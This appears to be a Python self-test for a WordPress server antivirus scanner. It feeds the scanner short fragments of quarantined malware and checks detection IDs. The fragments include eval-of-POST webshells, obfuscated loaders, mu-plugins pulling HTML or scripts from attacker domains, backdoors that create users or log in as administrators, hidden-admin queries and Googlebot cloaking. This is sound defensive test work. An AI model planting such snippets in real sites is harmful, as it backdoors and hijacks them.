#!/usr/bin/env python3
"""Self-check tanda wp2shell (22 Okt 2026): potongan sampel karantina khankimi/bayarlis terdeteksi, kode sah tidak."""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import server_antivirus_agent as ag  # noqa: E402


def tanda(nama, isi):
    return {t['id'] for t in ag.periksa('/home/u/domains/d/public_html/' + nama, ag.ekstensi(os.path.basename(nama)), isi)}


WPC = b"<?php\ndefine( 'DB_NAME', '%s' );\ndefine( 'DB_USER', 'u' );\ndefine( 'DB_PASSWORD', 'x' );\ndefine( 'DB_HOST', '%s' );\n"
KENA = [
    ('3PJcpMFsD8B.php', b'<?php\n$h= \t\tfunction ($c) {\r\n    EVAL \t\t($c);\r\n};', 'VD.PHP.EvalClosure'),
    ('x/index.php', b"<?php define('O0O0O0', 'O0O00O');$GLOBALS[O0O0O0] = explode('|H|Z|8', 'ini_set|H|Z|8eval');", 'VD.PHP.GlobalsExplode'),
    ('wp-content/index.php', b'<?php\n$O00OO_0_O_=urldecode("%6E1%7A%62");$O000OOO___=$O00OO_0_O_{38};', 'VD.PHP.VariabelO0'),
    ('p/c.php', b"<?php $op=array('mv'=>strrev('elif_dedaolpu_evom'),'rm'=>strrev('knilnu'));", 'VD.PHP.StrrevFungsi'),
    ('ngji/index.php', b"<?php $A=['7068705f756e616d65','6368646972','66696c655f6765745f636f6e74656e7473','6261736536345f6465636f6465','756e6c696e6b','6d6b646972'];", 'VD.Webshell.HexNama'),
    ('SvVZ6/index.php', b"<?php $d = openssl_decrypt($e, 'AES-128-ECB', $k, 0);\neval('?>' . $d);", 'VD.PHP.EvalDekripsi'),
    ('index.php__01bd3b5', b"<?php $params['referer'] = $r; $params['agent'] = $a; $c = @gzuncompress(base64_decode($c)); echo $c;", 'VD.SEO.PintuTDS'),
    ('wp-content/.htaccess', b'<FilesMatch ".*\\.(py|exe|phtml|php|PHP|Php|php5|suspected)$">\n Require all denied\n</FilesMatch>', 'VD.Htaccess.KunciShell'),
    ('.htaccess', b'<FilesMatch "^(about.php|index.php|lock360.php|admin.php)$">\n Allow from all\n</FilesMatch>', 'VD.Htaccess.KunciShell'),
    ('wp-content/plugins/wp2shell_fc6a5c1c/a.php', b"<?php\n/*\nPlugin Name: wp2shell\n*/ echo 'WP2SHELL::' . shell_exec($c);", 'VD.W2S.Penanda'),
    ('wp-content/mu-plugins/hostinger-cache.php', b"<?php define('FM_CACHE_IDX_MARKER', 'FM_CACHE_IDX_INJECT');", 'VD.W2S.Penanda'),
    ('wp-content/mu-plugins/wp-fastest-cache.php', b"<?php add_action( 'pre_user_query', function ( $q ) { global $wpdb; $q->query_where .= \" AND user_login NOT LIKE '\" . $wpdb->esc_like( 'wp_' ) . \"%'\"; } );", 'VD.WP.SembunyiAdmin'),
    ('p/update-checker.php', b"<?php $_w=str_split('file_put_contents',1);$_w=implode('',$_w);", 'VD.Webshell.StrSplit'),
    ('wp-content/mu-plugins/cloudflare-v2-23.php', b"<?php if (!function_exists('lf_sync_mu_plugin_copy')) { function lf_sync_mu_plugin_copy() {} }", 'VD.WP.PintuBelakangMU'),
    ('wp-content/mu-plugins/compat-loader.php', b"<?php $ids = $wpdb->get_col(\"SELECT u.ID FROM u WHERE m.meta_value LIKE '%administrator%'\"); wp_set_current_user($i); wp_set_auth_cookie($i, true);", 'VD.WP.LoginAdminAcak'),
    ('wp-content/mu-plugins/site-compat-layer.php', b"<?php $u = sanitize_user($_GET['user'], true); $p = wp_unslash($_GET['pass']); $id = wp_create_user($u, $p, $e);", 'VD.WP.BuatUserGet'),
    ('wp-content/mu-plugins/index.php', b'<?php $__map = [];' + b''.join(b'$__map["k%d"] = "x";' % i for i in range(25)) + b' eval($__code);', 'VD.PHP.PetaEval'),
    ('index.php', b"<?php\n/*\nPlugin Name: SecurePluginLomxJhBs41\n*/\nclass LoaderHBBGL43537 { }", 'VD.PHP.LoaderSecurePlugin'),
    ('wp-content/uploads/search_template_1.php', b'<?php $key="ptr"; $bind = "$item/.elem"; include $bind;', 'VD.Webshell.PtrElem'),
    ('asset-manager.php', b"<?php define('FM_ROOT', __DIR__); $fm_key_file = __DIR__ . '/.fm_key';", 'VD.Webshell.FmRoot'),
    ('wp-config.php', WPC % (b'mytestdb', b'46.28.71.63:80'), 'VD.WP.ConfigDibajak'),
    ('wp-config.php', WPC % (b'x_wp1', b'203.0.113.9:443'), 'VD.WP.ConfigDibajak'),
    ('wp-config.php', WPC % (b'mytestdb', b'localhost'), 'VD.WP.ConfigDibajak'),
    ('wp-config.php', WPC % (b'x_wp1', b'db.example.net:3306'), 'VD.WP.ConfigDBRemote'),
    # Fahmi K 30 Okt: body-inject satunura/fpppkkab, mu WLH Recovery mitrame1, trash dimatikan situs PBN
    ('wp-content/mu-plugins/body-inject.php', b"<?php\nadd_action('wp_body_open', function () {\n    echo file_get_contents(\"https://bozuldumtamiroldumananisiktimamiroldum.xyz/remote/html.php\");\n});", 'VD.WP.BodyInject'),
    ('wp-content/mu-plugins/x.php', b"<?php add_action('wp_head', function () { echo @file_get_contents('https://cdn-x.top/h.php?d=' . $_SERVER['HTTP_HOST']); });", 'VD.WP.BodyInject'),
    ('wp-content/mu-plugins/y.php', b"<?php add_action('wp_footer', function(){}); add_action('wp_enqueue_scripts', function () { wp_enqueue_script('external-script', 'https://x.xyz/remote/js.php', [], null, true); });", 'VD.WP.BodyInject'),
    ('wp-content/mu-plugins/wp-1efe603358bc.php', b"<?php\n/**\n * WLH Recovery Channel (must-use). Dropped by WLH_Recovery_Installer.\n */\nif (!defined('WLH_REC_SALT')) define('WLH_REC_SALT', 'w9x2r7k5');", 'VD.WP.WLHRecovery'),
    ('wp-content/mu-plugins/z.php', b"<?php if (isset($_GET['wlh_recover'])) { wlh_rec_respond(1); }", 'VD.WP.WLHRecovery'),
    ('wp-config.php', WPC % (b'x_wp1', b'localhost') + b"define('EMPTY_TRASH_DAYS', 0 );\n", 'VD.WP.TrashMati'),
]
for nama, isi, harap in KENA:
    assert harap in tanda(nama, isi), (nama, harap, tanda(nama, isi))

AMAN = [
    ('wp-content/plugins/x/a.php', b"<?php $f = function ($x) { return eval_helper($x); }; $GLOBALS['wp_filter'] = explode(',', $s);"),
    ('wp-content/plugins/x/b.php', b"<?php $hash = '7068705f'; $s = strrev($nama); $p = str_split($teks, 1);"),
    ('.htaccess', b'<FilesMatch "\\.(?i:php[0-9]?|phtml|phar)$">\n    Require all denied\n</FilesMatch>'),
    ('wp-content/plugins/x/d.php', b"<?php class LoaderCache { } $key = 'ptr'; define('FM_ROOT', ABSPATH);"),
    ('wp-content/plugins/x/c.php', b"<?php $like = $wpdb->esc_like( 'wp_' ) . '%'; $wpdb->query( \"DELETE FROM $wpdb->options WHERE option_name LIKE '$like'\" );"),
    ('wp-config.php', WPC % (b'x_wp1', b'localhost')),
    ('wp-config.php', WPC % (b'x_wp1', b'localhost:/var/lib/mysql/mysql.sock')),
    ('wp-config.php', WPC % (b'x_wp1', b'127.0.0.1:3306')),
    ('wp-config-sample.php', WPC % (b'mytestdb', b'46.28.71.63:80')),
    ('wp-config.php', WPC % (b'x_wp1', b'localhost') + b"define('EMPTY_TRASH_DAYS', 30 );\n"),
    ('wp-content/plugins/x/e.php', b"<?php add_action('wp_head', function () { echo '<link rel=preconnect href=\"https://fonts.gstatic.com\">'; $r = wp_remote_get('https://api.wordpress.org/x'); });"),
    ('wp-content/plugins/x/f.php', b"<?php add_action('wp_enqueue_scripts', function () { wp_enqueue_script('gtag', 'https://www.googletagmanager.com/gtag/js?id=G-1', [], null); }); add_action('wp_head', 'f');"),
    ('wp-content/plugins/x/g.php', b"<?php add_action('wp_footer', 'f'); wp_enqueue_script('x', 'https://cdn.example.com/loader.php', [], null);"),
    ('wp-content/plugins/x/h.php', b"<?php $opt = get_option('wlh_settings_page'); // integrasi WLH resmi"),
]
for nama, isi in AMAN:
    assert not tanda(nama, isi), (nama, tanda(nama, isi))
assert ag.ekstensi('index.php__01bd3b5') == 'php' and ag.ekstensi('.htaccess') == 'htaccess'

# Karantina (28 Okt): malware tidak pernah dihapus permanen, tetap di karantina; inti → diganti salinan asli
import hashlib, io, tempfile  # noqa: E401,E402
tmp = tempfile.mkdtemp()
ag.HOME, ag.KARANTINA, ag._INTI_OK = tmp, tmp + '/karantina', {}
akar = tmp + '/u/domains/d.com/public_html/'
ASLI = b'<?php\n// isi resmi wp-load.php\n'
ag._CHECKSUM_WP['6.9.10'] = {'wp-load.php': hashlib.md5(ASLI).hexdigest(), 'wp-includes/version.php': 'x'}
ag.urllib.request.urlopen = lambda req, timeout=0: io.BytesIO(ASLI if req.full_url.endswith('/tags/6.9.10/wp-load.php') else b'lain')
BERKAS = {'wp-includes/version.php': b"<?php\n$wp_version = '6.9.10';\n", 'wp-config.php': WPC % (b'x_wp1', b'localhost'),
          'wp-load.php': b'<?php eval($_POST["x"]);', 'wp-content/uploads/s.php': b'<?php eval($_POST["x"]);',
          'wp-content/uploads/r.php': b'<?php $f = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);',
          '.htaccess': b'AddHandler application/x-httpd-php .jpg\n'}
for rel, isi in BERKAS.items():
    os.makedirs(os.path.dirname(akar + rel), exist_ok=True)
    with open(akar + rel, 'wb') as f:
        f.write(isi)
r = ag.karantina({'path': akar + 'wp-content/uploads/s.php'})
assert r['ok'] and not os.path.exists(akar + 'wp-content/uploads/s.php') \
    and os.path.exists(ag.KARANTINA + '/' + r['id'] + '/berkas'), r
r = ag.karantina({'path': akar + 'wp-content/uploads/r.php'})
assert r['ok'] and os.path.exists(ag.KARANTINA + '/' + r['id'] + '/berkas'), r
r = ag.karantina({'path': akar + 'wp-load.php'})
assert r['pulih']['ok'] and open(akar + 'wp-load.php', 'rb').read() == ASLI \
    and os.path.exists(ag.KARANTINA + '/' + r['id'] + '/berkas'), r
r = ag.karantina({'path': akar + '.htaccess'})
assert r['pulih']['ok'] and open(akar + '.htaccess', 'rb').read() == ag.HTACCESS_WP, r
r = ag.karantina({'path': akar + 'wp-config.php'})
assert not r['pulih']['ok'] and os.path.exists(akar + 'wp-config.php'), r
# Whitelist path saja: tanda curiga diredam, tanda virus tetap dilaporkan
PT = [{'path': '/home/u/domains/d/public_html/wp-content/uploads', 'jenis': 'folder'}]
TV = [{'id': 'VD.PHP.EvalInput', 'tingkat': 'virus'}, {'id': 'VD.PHP.DiUploads', 'tingkat': 'curiga'}]
assert ag.saring_putih('/home/u/domains/d/public_html/wp-content/uploads/a.php', PT, TV) == TV[:1]
assert ag.saring_putih('/home/u/domains/d/public_html/wp-content/a.php', PT, TV) == TV
assert "_seed\\_targets" in ag.sql_ioc('wp_')

# ponpeshpaicmerapi 28 Okt: kasino asing digeser keluar layar = tersembunyi (virus); di menu display:none tidak
SEMBUNYI = b'<div style="position: absolute; left: -9966px;"><p><a href="https://x.pl/">Lemon casino</a> Poland</p></div>'
assert [t['id'] for t in ag.periksa_db(SEMBUNYI * 3)] == ['VD.DB.JudiTersembunyi'], ag.periksa_db(SEMBUNYI)
MENU = b'<ul style="display:none"><li><a href="/berita/1">Kasino ilegal digerebek</a></li><li><a href="/b/2">Bandar online casino ditangkap</a></li></ul>'
assert 'VD.DB.JudiTersembunyi' not in [t['id'] for t in ag.periksa_db(MENU)]
JSON = b'{"before_article_end":"<div style=\\"position:absolute;left:-99999px\\">Try <a href=\\"https:\\/\\/x.uk\\/\\">non GamStop casinos<\\/a><\\/div>"}'
assert [t['id'] for t in ag.periksa_db(JSON)] == ['VD.DB.JudiTersembunyi'], ag.periksa_db(JSON)
GSC = (b"<?php\n/*\nPlugin Name: Site Verify GSC\n*/\nadd_action('wp_head', function(){ echo '<meta name=\"google-site-verification\" "
       b"content=\"WCW9kAlbHYVzC5o8hc90omOQpvzmO8QBr7rUh-Fo8KE\" />'; });")
assert 'VD.WP.GSCPalsu' in tanda('wp-content/plugins/site-verify-gsc/site-verify-gsc.php', GSC)
assert 'VD.WP.GSCPalsu' not in tanda('wp-content/plugins/seo/a.php', GSC + b'//' + b'x' * 4000)
# Application password & sesi admin (dibuat sekarang → ≤60 hari)
import time  # noqa: E402
APP = (b'a:2:{i:0;a:7:{s:4:"uuid";s:36:"u";s:6:"app_id";s:0:"";s:4:"name";s:21:"auto-job-local-2682d7";s:8:"password";s:3:"$x$";'
       b's:7:"created";i:%d;s:9:"last_used";i:%d;s:7:"last_ip";s:14:"158.46.223.153";}i:1;a:7:{s:4:"uuid";s:1:"v";s:6:"app_id";s:0:"";'
       b's:4:"name";s:6:"Jetpak";s:8:"password";s:3:"$y$";s:7:"created";i:1600000000;s:9:"last_used";N;s:7:"last_ip";N;}}') % (time.time(), time.time())
assert [x[0][0] for x in ag.akses_admin(b'_application_passwords', APP)] == ['VD.DB.AppPasswordPeretas']
for nama, tanda in ((b'Aplikasi WordPress untuk Android di Xiaomi 23021RAA2Y', []), (b'Jetpack iOS app on iPhone', []),
                    (b'android-wordpress-client', []), (b'otomasi', ['VD.DB.AppPassword']),
                    (b'WordPress iOS app on iPhone pbn', ['VD.DB.AppPasswordPeretas'])):
    assert [x[0][0] for x in ag.akses_admin(b'_application_passwords', APP.replace(b's:21:"auto-job-local-2682d7"', b's:%d:"%s"' % (len(nama), nama)))] == tanda, nama
SESI = b''.join(b's:64:"%064d";a:4:{s:10:"expiration";i:1;s:2:"ip";s:9:"10.0.0.%d";}' % (i, i) for i in range(25))
assert [x[0][0] for x in ag.akses_admin(b'session_tokens', SESI)] == ['VD.DB.SesiBanjir']
assert not ag.akses_admin(b'session_tokens', SESI[:SESI.index(b's:64:"%064d"' % 5)])
assert ag.admin_siluman('ponpeshp@ponpeshpaicmerapi.com', 'ponpeshp@ponpeshpaicmerapi.com', 3)[0][0] == 'VD.DB.AdminCuriga'
assert ag.admin_siluman('ponpeshp', 'hpaicenter1@gmail.com', 3) is None
assert ag.admin_siluman('wp-reports', '', 500)[0][0] == 'VD.DB.AdminSiluman'
assert ag.admin_siluman('sys_dac5c815', 'noreply@patriotbangsa.com', 500)[0][0] == 'VD.DB.AdminSiluman'
assert ag.admin_siluman('sys_admin', 'sys@contoh.com', 3) is None
# 30 Okt: app password "sentinel" (PBN mitrame1) persis; nama lain yang memuat kata itu tidak
for nama, harap in ((b'sentinel', ['VD.DB.AppPasswordPeretas']), (b'Sentinel Backup', ['VD.DB.AppPassword'])):
    assert [x[0][0] for x in ag.akses_admin(b'_application_passwords', APP.replace(b's:21:"auto-job-local-2682d7"', b's:%d:"%s"' % (len(nama), nama)))] == harap, nama
# Opsi WLH tersamar & kasino massal: SQL memuat polanya, 1 baris per situs/penulis
assert "REGEXP '^wp_[0-9a-f]{24}$'" in ag.sql_ioc('wp_') and "'wlh\\_%'" in ag.sql_ioc('wp_') and ag.TANDA_DB_IOC[ag.JENIS_IOC['wlh']][0] == 'VD.DB.WLHOpsi'
assert 'GROUP BY post_author HAVING COUNT(*) >= 20' in ag.sql_massal('wp_') and 'VD.DB.KasinoMassal' in {t['id'] for t in ag.INFO_TANDA}
# 3 Nov: botnet WLH/wp-helper (14 situs sanke/Farnaz/Kiya) — app password bootstrap, admin wpm_/www., plugin Site Performance Helper, cron
for nama, harap in ((b'auto-bootstrap', ['VD.DB.AppPasswordPeretas']), (b'content-sync', ['VD.DB.AppPasswordPeretas']),
                    (b'bootstrap-18f203', ['VD.DB.AppPasswordPeretas']), (b'Dorgen Panel', ['VD.DB.AppPasswordPeretas']),
                    (b'bootstrap-ku', ['VD.DB.AppPassword'])):
    assert [x[0][0] for x in ag.akses_admin(b'_application_passwords', APP.replace(b's:21:"auto-job-local-2682d7"', b's:%d:"%s"' % (len(nama), nama)))] == harap, nama
assert ag.admin_siluman('wpm_0dd1286a', 'audit@wp.local', 500)[0][0] == 'VD.DB.AdminSiluman'
assert ag.admin_siluman('orion15570', 'orion15570@www.smpn1gbawai.com', 500)[0][0] == 'VD.DB.AdminSiluman'
assert ag.admin_siluman('budi', 'budi2024@www.contoh.com', 500) is None and ag.admin_siluman('wpm_admin', 'a@contoh.com', 3) is None
assert "wlh\\_health\\_event" in ag.sql_ioc('wp_') and ag.sql_ioc('wp_').count('`wp_options`') == 3
tanda_f = lambda nama, isi: {t['id'] for t in ag.periksa('/home/u/domains/d/public_html/' + nama, ag.ekstensi(os.path.basename(nama)), isi)}
PH = (b"<?php\n/*\nPlugin Name: Site Performance Helper\nDescription: Optimizes search engine visibility and rankings.\n*/\n"
      b"define('WPM_ADMIN', base64_decode('d3BtXzcwNWZmZDNi'));\nadd_action('wp_loaded', 'wpm_ens_admin_36c6a2ad');")
assert 'VD.WP.PerfHelper' in tanda_f('wp-content/plugins/wp-helper-9ad144/wp-helper-9ad144.php', PH)
assert 'VD.WP.PerfHelper' in tanda_f('wp-content/plugins/x/x.php', b"<?php add_filter('pre_user_query', 'wpm_h_sql_36c6a2ad', 99);")
assert 'VD.WP.PerfHelper' not in tanda_f('wp-content/plugins/wp-meta/x.php', b"<?php $wpm_admin = get_option('wpm_settings'); // Site Performance")
assert 'VD.WP.LinkHelper' in tanda_f('wp-content/mu-plugins/wp-0a1b2c3d4e5f.php', b"<?php $u = 'https://cachelayer.top/api/handshake';")
# 3 Nov: ClickFix "Wp Engine" (attelect/steialamar/rgped sanke), KodExplorer + doorway list.txt + cloaker home.php (attelect)
WPE = (b"<?php\n/**\n * Plugin Name:  Wp Engine\n */\nadd_filter( 'all_plugins', function( $plugins ) {\n    unset( $plugins[ plugin_basename( __FILE__ ) ] );\n"
       b"    return $plugins;\n}, 23 );\nfunction wlcms_wp_engine_854_src() {\n    $raw = <<<'_B64_FFF636'\nKGZ1bmN0aW9u\n_B64_FFF636;\n}\n"
       b"function wlcms_wp_engine_854_out() { echo '<scr' . 'ipt>' . wlcms_wp_engine_854_src() . '</scr' . 'ipt>'; }")
assert {'VD.WP.WpEngineKit', 'VD.WP.SembunyiSkrip'} <= tanda_f('wp-content/plugins/Wp Engine/wp-engine.php', WPE)
WARDEN = WPE.replace(b'wlcms_wp_engine_854', b'wlcms_wp_warden_198').replace(b'_B64_FFF636', b'_B64_22E9D')
assert 'VD.WP.WpEngineKit' in tanda_f('wp-content/plugins/white-label-cms/white-label-cms.php', WARDEN)
LAIN = WPE.replace(b'wlcms_wp_engine_854', b'abc_x').replace(b'_B64_FFF636', b'EOT')
assert tanda_f('wp-content/plugins/q/q.php', LAIN) >= {'VD.WP.SembunyiSkrip'} and 'VD.WP.SembunyiDiri' not in tanda_f('wp-content/plugins/q/q.php', LAIN)
SEMBUNYI = b"<?php add_filter('all_plugins', function ($p) { unset($p[plugin_basename(__FILE__)]); return $p; });"
assert tanda_f('wp-content/plugins/q/q.php', SEMBUNYI) == {'VD.WP.SembunyiDiri'}
assert not tanda_f('wp-content/plugins/q/q.php', b"<?php add_filter('all_plugins', function ($p) { unset($p['hello.php']); return $p; });")
assert 'VD.Webshell.KodExplorer' in tanda_f('.well-known/acme-challenge/security/class/config/version.php', b"<?php\ndefine('KOD_VERSION','4.52');")
assert 'VD.Webshell.KodExplorer' in tanda_f('x/class/app/controller/user.class.php', b"<?php // KodExplorer user\nclass user extends Controller {}")
DW = (b'<?php\nfunction feedback404()\n{\n header("HTTP/1.0 404 Not Found");\n}\n$tunnel = "id";\n$filename = "list.txt";\n'
      b'if (isset($_GET[$tunnel])) {\n $lines = file($filename, FILE_IGNORE_NEW_LINES);\n}')
assert 'VD.SEO.DoorwayList' in tanda_f('inc/index.php', DW)
assert 'VD.SEO.DoorwayList' not in tanda_f('wp-content/plugins/x/404.php', b'<?php function feedback404() { status_header(404); }')
HOME = (b"<?php\nfunction is_google_bot() {\n$agents = array(\"Googlebot\", \"Google-InspectionTool\");\nforeach ($agents as $agent) {\n"
        b"if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;\n}\nreturn false;\n}\nif (is_google_bot()) {\n"
        b"$bot_content = file_get_contents('.well-known/index.php');\necho $bot_content;\nexit;\n} else {\ninclude('wp-user.php');\n}")
assert 'VD.SEO.Cloaking' in tanda_f('home.php', HOME)
assert tanda_f('.well-known/-/get-sitemap.php', b'') == {'VD.PHP.DiWellKnown'} and not tanda_f('.well-known/acme-challenge/x', b'tok')
print('ok: %d sampel kena, %d sampel aman, karantina/pulih inti' % (len(KENA), len(AMAN)))

# Bersihkan WP opsi plugin: dropper lf_sync_mu di plugins/ dan salinannya di mu-plugins/ ikut dikarantina
with tempfile.TemporaryDirectory() as d:
    isi = b"<?php if (!function_exists('lf_sync_mu_plugin_copy')) { function lf_sync_mu_plugin_copy() {} }"
    for sub in ('plugins/elementor-classic-editor', 'mu-plugins'):
        os.makedirs(os.path.join(d, 'wp-content', sub))
        open(os.path.join(d, 'wp-content', sub, 'elementor-classic-editor.php'), 'wb').write(isi)
    assert len(ag.plugin_samaran(d)) == 2, ag.plugin_samaran(d)
